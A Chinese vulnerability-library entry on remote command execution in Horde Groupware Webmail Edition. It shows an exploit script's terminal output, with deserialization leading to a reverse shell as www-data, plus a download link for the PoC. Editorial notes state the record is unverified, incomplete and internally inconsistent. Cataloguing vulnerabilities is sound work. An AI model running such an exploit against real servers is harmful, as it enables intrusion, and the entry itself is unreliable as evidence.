---
source: "白阁文库 BaizeSec/bylibrary"
title: "Horde Groupware Webmail Edition 远程命令执行"
product: "Horde Groupware Webmail Edition"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Transcript supplies user/password; no version, advisory identity or prerequisites documented"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-74acfb3cb607b1ecc3651934"
entity_id: "ve-74acfb3cb607b1ecc3651934"
schema_version: "1"
---

# Horde Groupware Webmail Edition 远程命令执行

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Transcript supplies user/password; no version, advisory identity or prerequisites documented
- 证据范围：Transcript only; PoC behind Baidu share; invocation is missing separate path/port compared with full scripts elsewhere

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Second frontmatter block embedded in body
- No vulnerability identification, version range or mechanism
- Target in invocation differs from output; distinguish editorial mismatch from validation
- Evidence/source inadequate as standalone canonical entry

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

---
title: 'Horde Groupware Webmail Edition 远程命令执行'
date: Tue, 15 Sep 2020 08:55:10 +0000
draft: false
tags: ['白阁-漏洞库']
---

```
saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145
(+) targeting http://172.16.175.145/horde/
(+) obtained session iefankvohbl8og0mtaadm3efb6
(+) inserted our php object
(+) triggering deserialization...
(+) starting handler on port 1337
(+) connection from 172.16.175.145
(+) pop thy shell!
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/horde/services 


```

```
poc 链接：https://pan.baidu.com/s/1-P-9IUMpHKZDIXELIFIOJg 提取码：dgne
```


---

> 来源：白阁文库 BaizeSec/bylibrary
